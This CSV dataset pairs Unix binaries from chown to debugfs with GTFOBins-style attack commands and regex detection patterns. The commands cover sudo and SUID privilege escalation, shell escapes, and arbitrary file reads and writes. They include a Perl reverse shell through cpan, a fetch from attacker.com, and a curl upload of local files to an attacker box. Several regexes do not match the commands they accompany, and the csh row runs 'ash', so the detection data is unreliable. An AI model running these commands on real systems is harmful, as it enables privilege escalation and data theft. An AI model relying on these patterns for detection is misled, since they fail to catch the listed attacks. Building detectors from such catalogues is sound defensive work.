chown,suid,./chown $(id -un):$(id -gn) $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?chown\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
chown,sudo,sudo chown $(id -un):$(id -gn) $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?chown\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
chroot,suid,./chroot / /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?chroot\s*\-p\s+(?:/bin/(?:sh|bash))),
chroot,sudo,sudo chroot /,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?chroot\s+.+),
clamscan,file-read,"touch $TF/empty.yara
clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?clamscan\s*\-\-no\-summary\s*\-d\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
clamscan,suid,"touch $TF/empty.yara
./clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?clamscan\s*\-\-no\-summary\s*\-d\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
clamscan,sudo,"touch $TF/empty.yara
sudo clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?clamscan\s*\-\-no\-summary\s*\-d\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
cmp,file-read,cmp $LFILE /dev/zero -b -l,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cmp\s*\-b\s*\-l\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
cmp,suid,./cmp $LFILE /dev/zero -b -l,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cmp\s*\-b\s*\-l\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
cmp,sudo,sudo cmp $LFILE /dev/zero -b -l,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cmp\s*\-b\s*\-l\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
cobc,shell,"echo 'CALL ""SYSTEM"" USING ""/bin/sh"".' > $TF/x
cobc -xFj --frelax-syntax-checks $TF/x","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cobc\s*\-\-frelax\-syntax\-checks\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
cobc,sudo,"echo 'CALL ""SYSTEM"" USING ""/bin/sh"".' > $TF/x
sudo cobc -xFj --frelax-syntax-checks $TF/x","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cobc\s*\-\-frelax\-syntax\-checks\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
column,file-read,column $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?column\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
column,suid,./column $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?column\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
column,sudo,sudo column $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?column\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
comm,file-read,comm $LFILE /dev/null 2>/dev/null,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?comm\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
comm,suid,comm $LFILE /dev/null 2>/dev/null,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?comm\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
comm,sudo,sudo comm $LFILE /dev/null 2>/dev/null,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?comm\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
composer,shell,"echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json
composer --working-dir=$TF run-script x","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?composer\s*\-i\s*\-\-working\-dir\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
composer,limited-suid,"echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json
./composer --working-dir=$TF run-script x","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?composer\s*\-i\s*\-\-working\-dir\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
composer,sudo,"echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json
sudo composer --working-dir=$TF run-script x","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?composer\s*\-i\s*\-\-working\-dir\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
cowsay,shell,"echo 'exec ""/bin/sh"";' >$TF
cowsay -f $TF x","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cowsay\s*\-f\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
cowsay,sudo,"echo 'exec ""/bin/sh"";' >$TF
sudo cowsay -f $TF x","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cowsay\s*\-f\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
cowthink,shell,"echo 'exec ""/bin/sh"";' >$TF
cowthink -f $TF x","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cowthink\s*\-f\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
cowthink,sudo,"echo 'exec ""/bin/sh"";' >$TF
sudo cowthink -f $TF x","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cowthink\s*\-f\s+(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
cp,file-read,"cp ""$LFILE"" /dev/stdout","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cp\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
cp,file-write,"echo ""DATA"" | cp /dev/stdin ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cp\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
cp,suid,"echo ""DATA"" | ./cp /dev/stdin ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cp\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
cp,suid,"echo ""DATA"" > $TF
./cp $TF $LFILE","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cp\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)"
cp,suid,"./cp --attributes-only --preserve=all ./cp ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cp\s*\-\-attributes\-only\s*\-\-preserve\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","This can copy SUID permissions from any SUID binary (e.g., `cp` itself) to another."
cp,sudo,"echo ""DATA"" | sudo cp /dev/stdin ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cp\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
cp,sudo,"echo ""DATA"" > $TF
sudo cp $TF $LFILE","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cp\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)"
cp,sudo,"sudo cp /bin/sh /bin/cp
sudo cp",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cp\s+(?:/bin/(?:sh|bash))),"This overrides `cp` itself with a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `cp` by path. Warning, this is a destructive action."
cpan,shell,"cpan
! exec '/bin/bash'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cpan\s+(?:/bin/(?:sh|bash))),"`cpan` lets you execute perl commands with the `! command`.
"
cpan,reverse-shell,"export RHOST=localhost
export RPORT=9000
cpan
! use Socket; my $i=""$ENV{RHOST}""; my $p=$ENV{RPORT}; socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp"")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S""); open(STDOUT,"">&S""); open(STDERR,"">&S""); exec(""/bin/sh -i"");};","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cpan\s*\-i\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc -lvp RPORT` on the attacker box to receive the shell.
cpan,file-upload,"cpan
! use HTTP::Server::Simple; my $server= HTTP::Server::Simple->new(); $server->run();","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cpan\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Serve files in the local folder running an HTTP server on port 8080. Install the dependency via `cpan HTTP::Server::Simple`.
cpan,file-download,"export URL=http://attacker.com/file_to_get
cpan
! use File::Fetch; my $file = (File::Fetch->new(uri => ""$ENV{URL}""))->fetch();","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cpan\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Fetch a remote file via an HTTP GET request and store it in `PWD`.
cpan,sudo,"sudo cpan
! exec '/bin/bash'",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cpan\s+(?:/bin/(?:sh|bash))),
cpio,shell,"echo '/bin/sh </dev/tty >/dev/tty' >localhost
cpio -o --rsh-command /bin/sh -F localhost:",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cpio\s*\-o\s*\-\-rsh\-command\s*\-F\s+(?:/bin/(?:sh|bash))),
cpio,file-read,"echo ""$LFILE"" | cpio -o","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cpio\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","The content of the file is printed to standard output, between the cpio archive format header and footer."
cpio,file-read,"echo ""$LFILE"" | cpio -dp $TF
cat ""$TF/$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cpio\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The whole directory structure is copied to `$TF`.
cpio,file-write,"echo DATA >$LFILE
echo $LFILE | cpio -up $LDIR","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cpio\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Copies `$LFILE` to the `$LDIR` directory.
cpio,suid,"echo ""$LFILE"" | ./cpio -R $UID -dp $TF
cat ""$TF/$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cpio\s*\-R\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The whole directory structure is copied to `$TF`.
cpio,suid,"echo DATA >$LFILE
echo $LFILE | ./cpio -R 0:0 -p $LDIR","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cpio\s*\-R\s*\-p\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Copies `$LFILE` to the `$LDIR` directory.
cpio,sudo,"echo '/bin/sh </dev/tty >/dev/tty' >localhost
sudo cpio -o --rsh-command /bin/sh -F localhost:",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cpio\s*\-o\s*\-\-rsh\-command\s*\-F\s+(?:/bin/(?:sh|bash))),
cpio,sudo,"echo ""$LFILE"" | sudo cpio -R $UID -dp $TF
cat ""$TF/$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cpio\s*\-R\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The whole directory structure is copied to `$TF`.
cpio,sudo,"echo DATA >$LFILE
echo $LFILE | sudo cpio -R 0:0 -p $LDIR","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cpio\s*\-R\s*\-p\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Copies `$LFILE` to the `$LDIR` directory.
cpulimit,shell,cpulimit -l 100 -f /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cpulimit\s*\-l\s*\-f\s+(?:/bin/(?:sh|bash))),
cpulimit,suid,./cpulimit -l 100 -f -- /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cpulimit\s*\-l\s*\-f\s*\-p\s+(?:/bin/(?:sh|bash))),
cpulimit,sudo,sudo cpulimit -l 100 -f /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cpulimit\s*\-l\s*\-f\s+(?:/bin/(?:sh|bash))),
crash,shell,"crash -h
!sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?crash\s*\-h\s+.+),"This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
crash,command,"COMMAND='/usr/bin/id'
CRASHPAGER=""$COMMAND"" crash -h","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?crash\s*\-h\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
crash,sudo,"sudo crash -h
!sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?crash\s*\-h\s+.+),"This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
crontab,command,crontab -e,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?crontab\s*\-e\s+.+),The commands are executed according to the crontab file edited via the `crontab` utility.
crontab,sudo,sudo crontab -e,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?crontab\s*\-e\s+.+),The commands are executed according to the crontab file edited via the `crontab` utility.
csh,shell,csh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?csh\s+.+),
csh,file-write,"export LFILE=file_to_write
ash -c 'echo DATA > $LFILE'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?csh\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
csh,suid,./csh -b,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?csh\s*\-b\s+.+),
csh,sudo,sudo csh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?csh\s+.+),
csplit,file-read,"csplit $LFILE 1
cat xx01","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?csplit\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
csplit,file-write,"echo ""DATA"" > $TF
LFILE=file_to_write
csplit -z -b ""%d$LFILE"" $TF 1","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?csplit\s*\-z\s*\-b\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Writes the data to `xx0file_to_write`. If needed, a different prefix can be specified with `-f` (instead of `xx`)."
csplit,suid,"csplit $LFILE 1
cat xx01","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?csplit\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
csplit,sudo,"csplit $LFILE 1
cat xx01","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?csplit\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
csvtool,file-read,csvtool trim t $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?csvtool\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","The file is actually parsed and manipulated as CSV, so this might not be suitable for arbitrary data."
csvtool,file-write,"echo DATA > $TF
csvtool trim t $TF -o $LFILE","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?csvtool\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","The file is actually parsed and manipulated as CSV, so this might not be suitable for arbitrary data."
csvtool,suid,./csvtool trim t $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?csvtool\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
csvtool,shell,csvtool call '/bin/sh;false' /etc/passwd,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?csvtool\s+(?:/bin/(?:sh|bash))),
csvtool,sudo,sudo csvtool call '/bin/sh;false' /etc/passwd,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?csvtool\s+(?:/bin/(?:sh|bash))),
cupsfilter,file-read,cupsfilter -i application/octet-stream -m application/octet-stream $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cupsfilter\s*\-i\s*\-m\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
cupsfilter,sudo,sudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cupsfilter\s*\-i\s*\-m\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
cupsfilter,suid,./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cupsfilter\s*\-i\s*\-m\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
curl,file-upload,"curl -X POST -d ""@$LFILE"" $URL","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?curl\s*\-X\s*\-d\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Omit the `@` to send hard-coded data."
curl,file-download,curl $URL -o $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?curl\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Fetch a remote file via HTTP GET request.
curl,file-read,curl file://$LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?curl\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The file path must be absolute.
curl,file-write,"echo DATA >$TF
curl ""file://$TF"" -o ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?curl\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",The file path must be absolute.
curl,suid,./curl $URL -o $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?curl\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Fetch a remote file via HTTP GET request.
curl,sudo,sudo curl $URL -o $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?curl\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Fetch a remote file via HTTP GET request.
cut,file-read,"cut -d """" -f1 ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cut\s*\-d\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
cut,suid,"./cut -d """" -f1 ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cut\s*\-d\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
cut,sudo,"sudo cut -d """" -f1 ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?cut\s*\-d\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
dash,shell,dash,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dash\s+.+),
dash,file-write,"export LFILE=file_to_write
dash -c 'echo DATA > $LFILE'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dash\s*\-c\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
dash,suid,./dash -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dash\s*\-p\s+.+),
dash,sudo,sudo dash,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dash\s+.+),
date,file-read,date -f $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?date\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
date,suid,./date -f $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?date\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
date,sudo,sudo date -f $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?date\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
dc,shell,dc -e '!/bin/sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dc\s*\-e\s+(?:/bin/(?:sh|bash))),
dc,sudo,sudo dc -e '!/bin/sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dc\s*\-e\s+(?:/bin/(?:sh|bash))),
dc,limited-suid,./dc -e '!/bin/sh',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dc\s*\-e\s+(?:/bin/(?:sh|bash))),
dd,file-write,"echo ""DATA"" | dd of=$LFILE","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dd\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
dd,file-read,dd if=$LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dd\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
dd,suid,"echo ""data"" | ./dd of=$LFILE","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dd\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
dd,sudo,"echo ""data"" | sudo dd of=$LFILE","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?dd\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
debugfs,shell,"debugfs
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?debugfs\s+(?:/bin/(?:sh|bash))),
debugfs,suid,"./debugfs
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?debugfs\s+(?:/bin/(?:sh|bash))),
debugfs,sudo,"sudo debugfs
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?debugfs\s+(?:/bin/(?:sh|bash))),
